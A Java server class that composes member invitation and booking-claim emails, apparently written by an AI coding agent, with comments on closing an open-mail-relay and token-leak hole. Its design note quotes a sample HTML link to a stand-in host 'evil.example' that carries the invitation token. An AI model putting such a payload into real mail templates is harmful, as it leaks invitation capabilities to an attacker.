package one.modality.crm.server.person;

import dev.webfx.platform.async.Batch;
import dev.webfx.platform.async.Future;
import dev.webfx.platform.conf.Config;
import dev.webfx.platform.conf.ConfigLoader;
import dev.webfx.platform.console.Console;
import dev.webfx.platform.substitution.Substitutor;
import dev.webfx.stack.db.query.QueryArgumentBuilder;
import dev.webfx.stack.db.query.QueryResult;
import dev.webfx.stack.db.query.QueryService;
import dev.webfx.stack.db.submit.GeneratedKeyReference;
import dev.webfx.stack.db.submit.SubmitArgument;
import dev.webfx.stack.db.submit.SubmitArgumentBuilder;
import dev.webfx.stack.db.submit.SubmitService;
import dev.webfx.stack.orm.datasourcemodel.service.DataSourceModelService;

/**
 * The member emails — invitation asked, invitation approved, bookings claimed — composed by the server.
 *
 * <p>The front office used to insert these as Mail + Recipient rows itself. It chose the destination
 * address, the sending account, the body and every URL in it, and to build the approve/decline links it
 * was handed the invitation TOKEN. That is the mail relay in its purest form: a client that can name a
 * recipient can send from a Kadampa SES-verified address to anywhere.
 *
 * <h3>What the server takes back, and what it leaves</h3>
 *
 * <p>Taken back: <b>who receives it</b> (the person the operation acted on — never a name or address
 * the caller sent), <b>which account it leaves from</b>, and <b>every link in it</b>. Left with the
 * browser: the translated prose, because these templates exist in every supported language and the
 * server has no equivalent i18n. That is a deliberate staging post rather than the end state — a
 * caller can still put chosen markup in front of a member it may already invite, which server-owned
 * templates will close.
 *
 * <h3>Why the links are substituted whole, and never the token</h3>
 *
 * <p>The obvious design is to let the body carry {@code {{TOKEN}}} and substitute the value. It is
 * also wrong: the body is the caller's, so {@code <a href="https://evil.example/?t={{TOKEN}}">} would
 * have the server paste the capability into somebody else's URL. The placeholders below are therefore
 * replaced with COMPLETE urls, built here from the configured origin and the token this server read.
 * The caller decides where a link sits in the prose; it cannot decide where it points.
 *
 * @author Claude Code
 */
final class MemberMail {

    private MemberMail() {
    }

    /**
     * Read on demand, never in a static initialiser.
     *
     * <p>A static field here would resolve the configuration while this class LOADS, which drags the
     * whole resource/config stack into anything that merely mentions the class — including the checks,
     * which have no platform up and could not then exercise even {@link #resolveLinks}, a pure string
     * function. Lazy also means a deployment that never sends a member email never has to be
     * configured for one.
     */
    private static Config config() {
        try {
            // ConfigLoader, NOT SourcesConfig. SourcesConfig parses the bundled declare@ files and
            // performs no substitution at all, so it hands back the literal "${{ FRONTOFFICE_ORIGIN }}"
            // — which this class reads as unconfigured and silently stops sending on. ConfigLoader's
            // root config is the MERGE of the loaded providers over those sources, and the providers
            // are what resolve a deploy's environment. It falls back to the raw sources before that
            // load completes, which is also handled: unresolved means skip, and no member email is
            // ever sent during boot.
            return ConfigLoader.getRootConfig().childConfigAt(CONFIG_PATH);
        } catch (Throwable ignored) {
            // No config stack (a check, a tool) is "unconfigured", which the callers already handle by
            // skipping the send. It is never a reason to fail the operation that asked for the mail.
            return null;
        }
    }

    /** Where this plugin's keys live; matches its declare@modality.crm.server.person.properties. */
    static final String CONFIG_PATH = "modality.crm.server.person";

    /** Placeholders the browser leaves in the body for this class to fill with whole urls. */
    static final String APPROVE_LINK = "{{APPROVE_LINK}}";
    static final String DECLINE_LINK = "{{DECLINE_LINK}}";
    static final String ACCOUNT_LINK = "{{ACCOUNT_LINK}}";

    /** What mail.subject holds; the prose is the browser's, the column is not. */
    private static final int MAX_SUBJECT = 255;
    /** recipient.name is varchar(91). */
    private static final int MAX_NAME = 91;

    /** Everything needed to address one: the operation tells us the person, never the caller. */
    private static final String RECIPIENT_SQL =
        "select first_name, last_name, email from person where id = $1 and removed = false";

    private static final String MAIL_SQL =
        "insert into mail (account_id, out, subject, content, from_name, from_email)" +
        " values ($1, true, $2, $3, $4, $5) returning id";

    private static final String RECIPIENT_INSERT_SQL =
        "insert into recipient (mail_id, person_id, name, email, \"to\", cc, bcc, ok)" +
        " values ($1, $2, $3, $4, true, false, false, false)";

    /**
     * Says at boot whether these emails can go out at all.
     *
     * <p>Without this the only signal is {@link #sendToPerson}'s warning, which appears the first time
     * somebody invites a member and not before — so a deploy with an unresolved origin looks perfectly
     * healthy until an inviter waits for a reply to a mail that was never sent. That is the failure
     * this whole class is most likely to have, because it is the one with no symptom.
     *
     * <p>Modelled on the identity-token keys, which announce themselves the same way. Called once the
     * configuration has actually LOADED — reading it at class-init or at job start would find only the
     * bundled sources, where the value is still {@code ${{ FRONTOFFICE_ORIGIN }}}, and would report a
     * correctly configured deploy as broken.
     */
    static void announceConfiguration() {
        String baseUrl = configuredBaseUrl();
        if (baseUrl == null)
            Console.log("⚠️ Member emails are DISABLED: " + CONFIG_PATH + ".frontofficeBaseUrl is unset"
                        + " or unresolved. Invitations will still be created — and nobody will be told."
                        + " The AWS deploys pass FRONTOFFICE_ORIGIN here.");
        else
            Console.log("🔗 Member emails will link to " + baseUrl);
    }

    /**
     * Sends one member email to the person an operation just acted on.
     *
     * <p>Returns success when there is nothing to send, and that is not laziness. A person with no
     * address cannot be emailed, an unconfigured origin cannot produce a working link, and in both
     * cases the OPERATION has already happened — the invitation exists, the claim is done. Failing the
     * operation because its announcement could not go out would undo something correct for the sake of
     * something cosmetic. The skip is logged, loudly enough to notice and without naming the member.
     *
     * @param personId     who the operation acted on, read from the operation and never from the caller
     * @param subject      the browser's translated subject line
     * @param body         the browser's translated HTML, carrying the placeholders above
     * @param token        the invitation token for the approve/decline links, or null when there is none
     * @param callerUserId the caller's principal, for the audit trail on the rows this writes
     */
    static Future<Void> sendToPerson(Object personId, Object subject, Object body, String token,
                                     Object callerUserId) {
        String baseUrl = configuredBaseUrl();
        if (baseUrl == null) {
            Console.log("⚠️ Member email not sent: modality.crm.server.person.frontofficeBaseUrl is unset"
                        + " or unresolved, so no link in it could be built. The operation itself is done.");
            return Future.succeededFuture();
        }
        if (personId == null || subject == null || body == null)
            return Future.succeededFuture();
        return ServerWrite.asServer(() -> QueryService.executeQuery(new QueryArgumentBuilder()
                .setDataSourceId(DataSourceModelService.getDefaultDataSourceId())
                .setStatement(RECIPIENT_SQL)
                .setParameters(personId)
                .build()))
            .compose(rows -> {
                String email = valueAt(rows, 2);
                if (email == null || email.isBlank()) {
                    // A member row with no address of its own — most of them, in fact. Nothing to do,
                    // and the front office skipped the same case before this moved server-side.
                    Console.log("ℹ️ Member email not sent: that person has no address of their own.");
                    return Future.succeededFuture();
                }
                String name = joinName(valueAt(rows, 0), valueAt(rows, 1));
                return write(personId, email, name, String.valueOf(subject),
                    resolveLinks(String.valueOf(body), baseUrl, token), callerUserId);
            });
    }

    /**
     * Replaces each placeholder with a whole url built here. A placeholder that has no token to build
     * with becomes the account page rather than a broken link — the mail still says something useful.
     */
    static String resolveLinks(String body, String baseUrl, String token) {
        String account = baseUrl + "/members";
        String approve = token == null ? account : baseUrl + "/members/approve/" + token;
        String decline = token == null ? account : baseUrl + "/members/decline/" + token;
        return body.replace(APPROVE_LINK, approve)
                   .replace(DECLINE_LINK, decline)
                   .replace(ACCOUNT_LINK, account);
    }

    private static Future<Void> write(Object personId, String email, String name, String subject,
                                      String content, Object callerUserId) {
        SubmitArgument mail = new SubmitArgumentBuilder()
            .setDataSourceId(DataSourceModelService.getDefaultDataSourceId())
            .setStatement(MAIL_SQL)
            // " returning id" with setReturnGeneratedKeys is what the recipient's reference below
            // resolves against; without the pair every send fails.
            .setParameters(configuredMailAccountId(), cut(subject, MAX_SUBJECT), content,
                "Kadampa Booking System", "kbs@kadampa.net")
            .setReturnGeneratedKeys(true)
            .build();
        SubmitArgument recipient = new SubmitArgumentBuilder()
            .setDataSourceId(DataSourceModelService.getDefaultDataSourceId())
            .setStatement(RECIPIENT_INSERT_SQL)
            .setParameters(new GeneratedKeyReference(0), personId, cut(name, MAX_NAME), email)
            .build();
        return ServerWrite.asServerActingFor(callerUserId,
                () -> SubmitService.executeSubmitBatch(new Batch<>(new SubmitArgument[] { mail, recipient })))
            .map(ignored -> null);
    }

    /** Unset, unresolved and blank all mean "cannot build a link" — see the class note. */
    private static String configuredBaseUrl() {
        Config config = config();
        String value = config == null ? null : config.getString("frontofficeBaseUrl");
        if (value == null || !Substitutor.areValuesNonNullAndResolved(value) || value.isBlank())
            return null;
        String trimmed = value.trim();
        return trimmed.endsWith("/") ? trimmed.substring(0, trimmed.length() - 1) : trimmed;
    }

    private static Integer configuredMailAccountId() {
        Config config = config();
        Integer configured = config == null ? null : config.getInteger("mailAccountId");
        return configured == null ? 27 : configured;
    }

    private static String valueAt(QueryResult rows, int column) {
        if (rows == null || rows.getRowCount() == 0)
            return null;
        Object value = rows.getValue(0, column);
        return value == null ? null : String.valueOf(value);
    }

    private static String joinName(String first, String last) {
        String joined = ((first == null ? "" : first) + " " + (last == null ? "" : last)).trim();
        return joined.isEmpty() ? null : joined;
    }

    private static String cut(String text, int max) {
        if (text == null)
            return null;
        return text.length() <= max ? text : text.substring(0, max);
    }
}
